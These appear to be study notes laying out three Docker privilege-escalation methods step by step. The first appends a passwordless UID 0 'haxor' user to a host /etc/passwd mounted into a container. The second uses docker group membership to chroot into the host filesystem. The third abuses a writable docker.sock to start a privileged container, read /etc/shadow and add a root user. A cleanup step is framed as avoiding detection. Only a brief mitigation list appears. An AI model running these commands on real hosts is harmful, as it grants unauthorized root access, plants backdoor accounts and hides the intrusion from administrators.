-------------------------------------------------------------------------------------------------------------------------------------
Approch 1:
----------
üéØ Goal:
Create a new root user on the host system by modifying /etc/passwd and /etc/shadow files via a Docker container.
========================================================================================================================
üß† Key Concepts:
üîπ What are /etc/passwd and /etc/shadow?
File	Purpose
/etc/passwd	Contains user account information (username, UID, shell, etc.)
/etc/shadow	Stores encrypted passwords and password expiration info

Together, they define who can log in to the system and with what password.
========================================================================================================================
üîπ What is Volume Mounting?
With Docker, you can mount host directories inside a container using the -v flag:

      docker run -v /etc:/mnt/etc ubuntu
‚û°Ô∏è This allows the container to see and modify the host‚Äôs /etc directory.

If the container is privileged or has enough permissions, it can edit host config files.
========================================================================================================================
üîì Exploitation: Adding a Root User
By modifying the host‚Äôs /etc/passwd and /etc/shadow, you can create a fake root-level user.
‚úÖ Example Commands:
        echo 'haxor::0:0:root:/root:/bin/bash' >> /mnt/etc/passwd
Adds a user named haxor

UID 0 = root user
No password (2nd field is empty)
Home: /root
Shell: /bin/bash
========================================================================================================================
‚ö†Ô∏è This user will have full root access just like the actual root user.

        echo 'haxor:$6$hashvaluehere:19229:0:99999:7:::' >> /mnt/etc/shadow
Adds a password hash for haxor

$6$ = SHA-512 encryption

hashvaluehere should be replaced with a real hashed password (you can create this using openssl or mkpasswd)

========================================================================================================================
üß™ How to Login as haxor:
Once added, you can:

Reboot the host
Switch user with su haxor or login directly
Use the shell with root access

========================================================================================================================
üõ°Ô∏è Why This Works (and Why It‚Äôs Dangerous):
This is possible if:

A container is run with write access to host /etc

The container has root inside and host filesystem mounted

      docker run --rm -it \
        --privileged \
        -v /etc:/mnt/etc \
        ubuntu bash

From there, you can directly manipulate the host‚Äôs critical auth files.

========================================================================================================================
üîê Mitigation:
Never mount sensitive directories (/etc, /root, /var/run/docker.sock) into containers unnecessarily.

Run containers as non-root users with limited permissions.

Use Docker security features like:

AppArmor/SELinux
Read-only mounts
Rootless containers
Monitor containers for unexpected writes to mounted volumes

üß™ Summary:
Action	Effect
Mount host‚Äôs /etc	Gain access to sensitive auth config
Modify passwd/shadow	Add a new root user
Result	Full root access to the host

---------------------------------------------------------------------------------------------------------------------------------------------
Approch 2:
----------
User is in the docker group
Members of the docker group can run containers as root.

This means they can mount the host filesystem and chroot into it.

Example:

      docker run -v /:/mnt --rm -it alpine chroot /mnt bash

‚û°Ô∏è Drops you into the host's root environment, effectively as root.

---------------------------------------------------------------------------------------------------------------------------------------------
Approch 3:
----------
üõ† What Is /var/run/docker.sock?

/var/run/docker.sock is a Unix socket file used by the Docker CLI and Docker API to communicate with the Docker daemon (dockerd). This socket gives full control over Docker operations.
Docker Daemon = Root: The Docker daemon usually runs as root.

So if you can interact with /var/run/docker.sock, you can ask Docker to do anything root can do ‚Äî including spawning containers with root access.
========================================================================================================================
üö© Why Is This Dangerous?
If a non-root user can read/write to /var/run/docker.sock, they can:

Create new containers.

Mount host directories into containers.

Escalate to full system root privileges.
========================================================================================================================
üß™ Step-by-Step Exploitation
Let‚Äôs walk through how to abuse writable Docker socket access to get root on the host.

‚úÖ Prerequisites
You:
Are inside a container or a user session.
Have read/write access to the Docker socket (/var/run/docker.sock).

üîß Step 1: Verify Docker Socket Access
--------------------------------------
Run this to check if the Docker socket exists and you can interact with it:

  ls -l /var/run/docker.sock

Output should show something like:

  srw-rw---- 1 root docker 0 Jun  9 14:00 /var/run/docker.sock

If your user is in the docker group, you can interact with it.

  docker ps

If this works, you're good to go!

üß® Step 2: Spawn a Privileged Container and Mount the Host
-----------------------------------------------------------
Now, let‚Äôs use Docker to spin up a privileged Alpine container, mounting the entire host filesystem.

    docker run -it --privileged -v /:/host alpine chroot /host

Explanation:

--privileged: Gives the container all Linux capabilities (effectively root).

-v /:/host: Mounts the host‚Äôs root (/) into /host inside the container.

alpine: A tiny Linux distro used as the container base.

chroot /host: This command switches the root directory to the host's filesystem = you‚Äôre now in the host OS context.

üîì Step 3: Now You Are Root on the Host
--------------------------------------
Inside this container, with chroot /host, you‚Äôre:

Operating directly inside the host‚Äôs filesystem.

Able to run commands as root.

    cat /host/etc/shadow
    useradd haxor -p 'password' -G root

üßº Step 4 (Optional): Cleanup
------------------------------
Once done, to avoid detection:

docker ps -a    # list running/created containers
docker rm <container-id>

